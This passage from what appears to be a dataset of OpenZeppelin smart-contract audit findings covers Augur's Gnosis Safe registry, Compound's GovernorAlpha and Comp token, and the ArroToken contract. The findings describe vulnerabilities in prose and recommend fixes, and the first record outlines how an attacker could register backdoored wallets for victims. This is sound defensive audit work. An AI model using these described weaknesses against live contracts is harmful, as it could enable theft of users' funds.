      "summary": "\nThe GnosisSafeRegistry contract is a single on-chain registry that keeps track of Augur users’ Gnosis Safe Multisig wallets. It is called upon creation of a Gnosis Safe Multisig so that Augur can quickly look up and verify a user’s wallet. The wallets are stored in the `accountSafes` mapping under the first address listed in the `owners` array of the `GnosisSafe` contract. There are restrictions in place to ensure that only wallets with a single owner and a threshold of 1 can be registered.\n\nUnfortunately, it is possible for an attacker to register malicious Gnosis Safe Multisig wallets under any owner address. By leveraging Gnosis Safe modules, an attacker can craft, deploy and register wallets with any owner address and modules attached that comply with all requirements enforced by Augur’s registry. These wallets would appear to be legitimate and victim-controlled, but would actually contain a malicious backdoor that would give the attacker unrestricted control over it.\n\nAt least two sensitive attack vectors have been identified. For a user that has never registered a wallet in the registry, an attacker can simply register a wallet with the victim’s address as its owner and perform actions through the wallet. For a user that has already registered a wallet in the registry, an attacker could deploy and register a wallet with the victim’s address as its owner.\n\nTo prevent any attacker from registering backdoored wallets for any owner address in Augur’s registry, Augur’s development team should consider implementing further restrictions. Suggestions include further restricting the type of Gnosis Safe Multisig wallets that can be registered to only those without modules attached, and ensuring the caller of the registry’s `register` and `callRegister` functions is the address listed in the `owners` array of the `GnosisSafe` contract.\n\nThis vulnerability has been fixed in commit `7787dba1`. Now only Gnosis Safe Multisig wallets deployed with known parameters and no modules can be registered.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11552",
      "title": "[L06] Undocumented, untested, custom behavior in transfer of ERC20 token",
      "impact": "LOW",
      "content": "When the [`transfer`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/Comp.sol#L93) and [`transferFrom`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/Comp.sol#L105) functions of the `Comp` token are called, they internally call the [`_transferTokens` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/Comp.sol#L217). This internal function can execute additional actions that are not part of the ERC20 standard. In particular, if the source and destination have different delegates registered, [the `_decreaseVotes` and `_increaseVotes` functions are executed](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/Comp.sol#L227-L230). This means that upon a transfer of tokens, delegates’ votes amounts may be updated.\n\n\nWhile the described custom behavior is fundamental to Compound’s governance system, it was found to be undocumented and untested.\n\n\nConsider explicitly explaining that delegates’ votes can be updated in the docstrings of `transfer` and `transferFrom` functions. Furthermore, consider adding related unit tests in [`CompTest.js`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/tests/Governance/CompTest.js) to ensure this sensitve feature works as expected.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11551",
      "title": "[L05] Not declaring return types in functions with return statements",
      "impact": "LOW",
      "content": "Public functions [`delegate`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/Comp.sol#L124) and [`delegateBySig`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/Comp.sol#L137) of the `Comp` contract include a `return` statement at the end of their execution, although they do not explicitly declare return types in their definition. Moreover, both functions attempt to return the result of the internal [`_delegate` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/Comp.sol#L199), which does not declare return types nor returns any value.\n\n\nConsider removing the `return` statements of the `delegate` and `delegateBySig` functions, keeping in both cases the internal call to the `_delegate` function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11550",
      "title": "[L04] Lack of input validation",
      "impact": "LOW",
      "content": "* The [`approve` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/Comp.sol#L80) of the `Comp` contract does not ensure that the `spender` address is not zero. See [OpenZeppelin’s implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.4.0/contracts/token/ERC20/ERC20.sol#L212) for reference.\n* The [`propose` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L150) of the `GovernorAlpha` contract allows the `description` parameter to be empty.\n\n\nConsider implementing `require` statements where appropriate to validate all user-controlled input.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11549",
      "title": "[L03] Missing docstrings",
      "impact": "LOW",
      "content": "All functions in the [`GovernorAlpha` contract](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol) lack documentation. This hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contract’s public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11548",
      "title": "[L02] Storage modification in require statement",
      "impact": "LOW",
      "content": "Inside the `require` statement in [line 143 of `Comp.sol`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/Comp.sol#L143), the signatory’s nonce is incremented right after being compared with the given nonce. In other words, the `require` statement fails if the given nonce is different from the one stored in the `nonces` mapping *before* it is incremented by one. Yet this subtlety of the language might no be caught by all readers, which can lead to confusions and errors in future changes to the code base.\n\n\nTo favor readability, consider incrementing the nonce outside the mentioned `require` statement, right after it has been verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11547",
      "title": "[L01] Lack of indexed parameters in events",
      "impact": "LOW",
      "content": "None of the parameters in the events defined in the [`GovernorAlpha` contract](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol) are indexed. Consider [indexing event parameters](https://solidity.readthedocs.io/en/v0.5.15/contracts.html#events) to avoid hindering the task of off-chain services searching and filtering for specific events.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11546",
      "title": "[M03] Proposal execution not handling returned data",
      "impact": "MEDIUM",
      "content": "The public [`execute` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L196) of the `GovernorAlpha` contract allows anyone to execute a queued proposal. Each action contained in the proposal will trigger a [call to the `executeTransaction` function of the `Timelock` contract](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L201). The [`executeTransaction` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Timelock.sol#L80) returns a `bytes` value containing whatever data is returned by the call to the target address. It is important to note that the data is never logged in the [emitted `ExecuteTransaction` event](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Timelock.sol#L102), thus it should be handled by the caller to avoid losing it. However, the returned data is not handled by the `execute` function of the `GovernorAlpha` contract. As a consequence, relevant data returned by the proposal’s actions may be lost.\n\n\nConsider handling the data returned by the subsequent calls to the `executeTransaction` function. Potential courses of action to be analyzed include logging the data in events, or returning it to the `execute` function’s caller in an array of `bytes` values.",
      "summary": "\nThis bug report is concerning the public `execute` function of the `GovernorAlpha` contract. It is important to note that when this function is called, it triggers a call to the `executeTransaction` function of the `Timelock` contract. This `executeTransaction` function returns data in the form of a `bytes` value, which is not handled by the `execute` function of the `GovernorAlpha` contract. As a result, the data returned by the proposal's actions may be lost. The report suggests handling the data returned by the `executeTransaction` function by either logging the data in events or returning it to the `execute` function’s caller in an array of `bytes` values.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11545",
      "title": "[M02] Lack of allowance front-running mitigation in ERC20 token",
      "impact": "MEDIUM",
      "content": "The [`Comp` contract](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/Comp.sol#L12) is an [ERC20](https://eips.ethereum.org/EIPS/eip-20) token contract that inherits from the [`EIP20Interface` interface](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/EIP20Interface.sol). However, it does not implement functions to mitigate the known [ERC20 allowance front-running issue](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit). This means that every token holder approving tokens to other accounts might be vulnerable to the front-running attack.\n\n\nConsider implementing functions to safely increment and decrement approved amounts. For reference, see functions [`increaseAllowance`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.4.0/contracts/token/ERC20/ERC20.sol#L104-L119) and [`decreaseAllowance`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.4.0/contracts/token/ERC20/ERC20.sol#L121-L138) in OpenZeppelin’s ERC20 de-facto standard implementation.",
      "summary": "\nThis bug report concerns the Comp contract, which is an ERC20 token contract. It is missing functions to prevent the known ERC20 allowance front-running issue, which means that token holders approving tokens to other accounts are vulnerable to this attack. To solve this issue, the report suggests implementing functions to safely increment and decrement approved amounts. These functions can be found in OpenZeppelin’s ERC20 de-facto standard implementation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11544",
      "title": "[M01] GovernorAlpha contract does not fully match specification",
      "impact": "MEDIUM",
      "content": "* The `proposalApproved(uint256): bool` function mentioned in the specification is not implemented.\n* According to the specification, a proposal can only succeed when, among other conditions, *“For votes are **greater** than the quorum threshold”*. However, in the implementation a proposal is considered successful when votes in favor are [**equal or greater** than the quorum threshold](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L237-L238).\n* According to the specification, the `GovernorAlpha` contract should have a maximum number of operations that a proposal can contain. However, the audited implementation does not impose any limit on the number of actions (see [`propose` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L150)). This may allow proposers to submit proposals that may never be queued, canceled or executed (as explained in issue **[H01] Approved proposal may be impossible to queue, cancel or execute**).\n\n\nConsider applying the necessary modifications to the code and / or to the specification so that they fully match. Should any deviation be intentional, consider explicitly documenting it with docstrings and inline comments.",
      "summary": "\nThe bug report discusses an issue with the `proposalApproved(uint256): bool` function mentioned in the specification of the `GovernorAlpha` contract. The issue is that in the implementation, a proposal is considered successful when votes in favor are equal or greater than the quorum threshold, whereas the specification states that for a proposal to be successful, votes must be greater than the quorum threshold. Additionally, the implementation does not impose any limit on the number of actions for a proposal, which could lead to proposals that may never be queued, canceled or executed.\n\nThe report suggests that the necessary modifications should be made to the code and/or the specification so that they match, and any intentional deviations should be explicitly documented with docstrings and inline comments.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11543",
      "title": "[H02] Queued proposal with repeated actions cannot be executed",
      "impact": "HIGH",
      "content": "The [`GovernorAlpha` contract](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol) allows to propose and queue proposals with repeated actions. That is, two or more actions in a proposal can have the same set of `target`, `value`, `signature` and `data` values.\n\n\nAssuming a proposal with repeated actions is approved by the governance system, then [each action in the proposal will be queued individually](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L190-L192) in the `Timelock` contract via subsequent calls to its [`queueTransaction` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Timelock.sol#L60). All queued actions are kept in the [`queuedTransactions` mapping](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Timelock.sol#L23) of the `Timelock` contract for future execution. While each action is [identified by the `keccak256` hash](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Timelock.sol#L64-L65) of its `target`, `value`, `signature`, `data` and `eta` values, it must be noted that all actions in the same proposal share the same `eta`. As a consequence, repeated actions always produce the same identifier hash. So a single entry will be created for them in the `queuedTransactions` mapping.\n\n\nWhen the time lock expires, the whole set of actions in a proposal can be executed atomically. In other words, the entire proposal must be aborted should one of its actions fail. To execute a proposal anyone can call the [`execute` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L196) of the `GovernorAlpha` contract. This will in turn call, [for each action in the proposal](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L200-L202), the [`executeTransaction` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Timelock.sol#L80) of the `Timelock` contract. Considering a proposal with duplicated actions, the first of them will be executed normally and [its entry in the `queuedTransactions` mapping will be set to `false`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Timelock.sol#L88). However, the second repeated action will share the same identifier hash as the first action. As a result, its execution will inevitably fail due to the [`require` statement in line 84 of `Timelock.sol`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Timelock.sol#L84), thus reverting the execution of the entire proposal.\n\n\nConsider modifying how each action in a proposal is identified so as to avoid clashes in their identifiers. This should allow for each action in a proposal to be identified uniquely, therefore enabling Compound’s governance system to execute queued proposals that contain repeated actions.\n\n\n**Update**: *Fixed in the follow-up commit [`f5976a8a1dcf4e14e435e5581bade8ef6b5d38ea`](https://github.com/compound-finance/compound-protocol-alpha/blob/f5976a8a1dcf4e14e435e5581bade8ef6b5d38ea/contracts/Governance) which introduced a change to explicitly disallow proposals with repeated actions to be queued in the `Timelock` contract.*",
      "summary": "\nThe GovernorAlpha contract in the Compound Protocol Alpha allows users to propose and queue proposals with repeated actions. If a proposal with repeated actions is approved, each action in the proposal will be queued individually in the Timelock contract via subsequent calls to its queueTransaction function. All queued actions are kept in the queuedTransactions mapping of the Timelock contract. Each action is identified by the keccak256 hash of its target, value, signature, data and eta values, however all actions in the same proposal share the same eta. This can cause a problem when the time lock expires, as the whole set of actions in a proposal must be aborted if one of its actions fails. \n\nTo fix this issue, a change was introduced to explicitly disallow proposals with repeated actions to be queued in the Timelock contract. This change ensures that each action in a proposal is identified uniquely and allows the Compound's governance system to execute queued proposals that contain repeated actions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11542",
      "title": "[H01] Approved proposal may be impossible to queue, cancel or execute",
      "impact": "HIGH",
      "content": "The [`propose` function](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L150) of the `GovernorAlpha` contract allows proposers to submit proposals with an unbounded amount of actions. Specifically, the function does not impose a hard cap on the number of elements in the arrays passed as parameters (i.e., `targets`, `values`, `signatures` and `calldatas`).\n\n\nAs a consequence, an approved proposal with a large number of actions can fail to be queued, canceled, or executed. This is due to the fact that the [`queue`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L186), [`cancel`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L206) and [`execute`](https://github.com/compound-finance/compound-protocol-alpha/blob/6858417c91921208c0b3ff342b11065c09665b1b/contracts/Governance/GovernorAlpha.sol#L196) functions iterate over the unbounded `targets` array of a proposal, which depending on the amount and type of actions, can lead to unexpected out-of-gas errors.\n\n\nSo as to avoid unexpected errors in approved proposals, consider setting a hard cap on the number of actions that they can include.",
      "summary": "\nThis bug report is about the `propose` function of the `GovernorAlpha` contract, which allows proposers to submit proposals with an unbounded amount of actions. This can cause unexpected out-of-gas errors in approved proposals, as the `queue`, `cancel` and `execute` functions iterate over the unbounded `targets` array of a proposal. To avoid these errors, it is recommended to set a hard cap on the number of actions that a proposal can include.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Alpha Governance System Audit",
      "source_link": "https://blog.openzeppelin.com/compound-alpha-governance-system-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11769",
      "title": "The totalSupply function does not return the real total supply",
      "impact": "LOW",
      "content": "The [`totalSupply`](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L131) function returns the difference between the token’s total supply defined in the constructor and the tokens owned by the zero address, which is not strictly the total supply amount.\n\n\nThis could lead to a misinterpretation of the real total supply of the token when querying it.\n\n\nConsider modifying the the `totalSupply` function implementation so it returns the real total supply value, and consider using the [OpenZeppelin’s ERC20 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.4.0/contracts/token/ERC20/ERC20.sol) that implements the [`_burn`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cdf655f770cf8412fbd4d6aef3c55194a1233ef1/contracts/token/ERC20/ERC20.sol#L191) and [`_burnFrom`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cdf655f770cf8412fbd4d6aef3c55194a1233ef1/contracts/token/ERC20/ERC20.sol#L226) functions to keep the total supply variable up-to-date.\n\n\n***Update:** Fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11768",
      "title": "Tokens can be transferred to the zero address",
      "impact": "LOW",
      "content": "The [`transfer`](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L149) and the [`transferFrom`](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L181) functions in the `ArroToken` contract do not prevent to transfer tokens to the zero address.\n\n\nConsider using the [OpenZeppelin’s ERC20 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.4.0/contracts/token/ERC20/ERC20.sol) which already covers this, or consider restricting the `to` parameter to non-zero addresses.\n\n\n***Update:** Fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11767",
      "title": "The TokenArro contract can be transferred to the zero address",
      "impact": "LOW",
      "content": "The [`transferOwnership`](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L89) function in the `Owned` contract does not prevent to transfer the ownership of the contract to the zero address.\n\n\nConsider using [OpenZeppelin’s Ownable contract](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.4.0/contracts/ownership/Ownable.sol) which already covers this, or consider restricting the new owner to non-zero addresses.\n\n\n***Update:** Fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11766",
      "title": "Wrong usage of inheritance with Safemath contract",
      "impact": "LOW",
      "content": "A [SafeMath contract](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L24) is implemented in order to manage arithmetic overflows and underflows.\n\n\nIn this contract, all its functions are defined as public, which means that the `ArroToken` contract will expose them as part of its API, as it inherits from `SafeMath`. This extends the functionality that should be exposed by an ERC20 token. Additionally, the gas costs of the deploy will be higher as opposed to using `SafeMath` as a library.\n\n\nGiven that the functionality of the `SafeMath` contract can be exposed as a library, consider using [OpenZeppelin’s SafeMath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.4.0/contracts/math/SafeMath.sol)\n\n\n***Update:** Fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11765",
      "title": "Duplicate code in transfer and transferFrom functions",
      "impact": "LOW",
      "content": "The [`transfer`](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L149) and [`transferFrom`](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L181) functions share very similar code.  \n\nDuplicate code is more difficult to maintain, as it is longer and needs to be updated in different sections of the codebase.\n\n\nConsider moving the duplicated code into another function and call it from the `transfer` and `transferFrom` functions.\n\n\n***Update:** Fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11764",
      "title": "owner and newOwner storage variables can be modified without events emission",
      "impact": "LOW",
      "content": "The [`owner`](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L75) and [`newOwner`](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L76) storage variables in the `Owned` contract are defined as `public`.  \n\nEven though they are not being modified within the `ArroToken` contract, there are no explicit validations for avoiding to assign them directly, which will bypass the emission of the `OwnershipTransferred` event.\n\n\nConsider using [OpenZeppelin’s Ownable contract](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.4.0/contracts/ownership/Ownable.sol) which already covers this, or consider declaring `owner` and `newOwner` variables as private, and add getter functions for accessing them.\n\n\n***Update:** Fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11763",
      "title": "Lack of event emission after modifying newOwner variable",
      "impact": "LOW",
      "content": "In line [90](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L90) and in line [96](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L96), the storage variable `newOwner` is being modifed, but no events are being triggered.\n\n\nThis means that there will be no record of the changes of the `newOwner` variable, and traceability of the potential new owners of the `TokenArro` will be lost.\n\n\nConsider to define an event for tracking the `newOwner` variable value, and emit an event each time it is modified.\n\n\n***Update:** Fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11762",
      "title": "Lack of event emission OwnershipTransferred on contract construction",
      "impact": "LOW",
      "content": "The `OwnershipTransferred` event is not being emitted when the [`ArroToken` contract is initialized](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L81).\n\n\nThis means that there will be no record of who was the initial owner of the token in the `OwnershipTransferred` event logs.\n\n\nConsider using [OpenZeppelin’s Ownable contract](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.4.0/contracts/ownership/Ownable.sol) which already covers this, or consider emitting an `OwnershipTransferred` after asigning the `owner` in the `Owned`‘s constructor.\n\n\n***Update:** Fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11761",
      "title": "Missing docstrings",
      "impact": "MEDIUM",
      "content": "All the contracts and functions in Arro’s code base lack proper documentation. This hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/v0.5.15/natspec-format.html) (NatSpec).\n\n\n***Update:** Partially fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1). Arro’s statement for this issue:*\n\n\n\n> \n>  The project structure has been changed to rely heavily on the OpenZeppelin ERC20 implementation. This provides a well-documented base of most of the contract functionality. The rest of the structure of the documentation has been changed to follow a consistent structure but will be updated in the future to follow the Ethereum Natural Specification Format 